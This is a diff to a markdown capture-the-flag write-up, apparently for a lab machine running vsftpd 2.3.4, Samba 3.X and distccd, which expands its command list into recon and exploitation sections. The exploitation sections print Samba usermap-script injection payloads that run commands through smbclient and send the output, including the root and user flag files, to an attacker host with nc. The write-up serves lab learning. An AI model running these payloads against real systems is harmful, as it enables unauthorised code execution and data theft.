@@ -109,15 +109,68 @@ Root/admin access came from the machine's core misconfiguration or vulnerability
 
 ## 🧰 Command Palette
 
-<details>
-<summary><b>Useful commands and technique anchors</b></summary>
+<details open>
+<summary><b>🔎 Recon</b></summary>
 
-- `nmap -sC -sV -p21,22,139,445,3632 <target>`
-- `smbclient -N //target/tmp --option='client min protocol=NT1'`
-- `logon "/=\`id | nc ATTACKER PORT\`"`
-- `logon "/=\`cat /root/root.txt | nc ATTACKER PORT\`"`
+```bash
+sudo nmap -sC -sV -Pn -p- -oN nmap_full.txt <target-ip>
+sudo nmap -sC -sV -Pn -p 21,22,139,445,3632 -oN nmap_tcp.txt <target-ip>
+
+# Key versions
+# 21/tcp   vsftpd 2.3.4
+# 139/445  Samba smbd 3.X
+# 3632     distccd
+```
 
 </details>
+
+<details open>
+<summary><b>🧪 Rabbit-hole Checks</b></summary>
+
+```bash
+# Tempting but not the final path in this solve
+searchsploit vsftpd 2.3.4
+searchsploit distccd
+nxc smb <target-ip> -u '' -p '' --shares
+smbclient -N -L //<target-ip>/ --option='client min protocol=NT1'
+```
+
+</details>
+
+<details open>
+<summary><b>💥 Samba usermap script RCE</b></summary>
+
+```bash
+# Start listener for command output
+nc -lvnp 4461
+
+# In another terminal, inject command through crafted SMB username/logon string
+printf 'logon "/=\`id | nc <attacker-ip> 4461\`"\n\n' | \
+  timeout 15 smbclient -N //<target-ip>/tmp --option='client min protocol=NT1'
+
+# Read root flag through the same primitive
+nc -lvnp 4462 > root_flag.txt
+printf 'logon "/=\`cat /root/root.txt | nc <attacker-ip> 4462\`"\n\n' | \
+  timeout 15 smbclient -N //<target-ip>/tmp --option='client min protocol=NT1'
+
+cat root_flag.txt
+```
+
+</details>
+
+<details open>
+<summary><b>👤 User Flag</b></summary>
+
+```bash
+nc -lvnp 4463 > user_flag.txt
+printf 'logon "/=\`cat /home/makis/user.txt | nc <attacker-ip> 4463\`"\n\n' | \
+  timeout 15 smbclient -N //<target-ip>/tmp --option='client min protocol=NT1'
+
+cat user_flag.txt
+```
+
+</details>
+
 
 ---
 
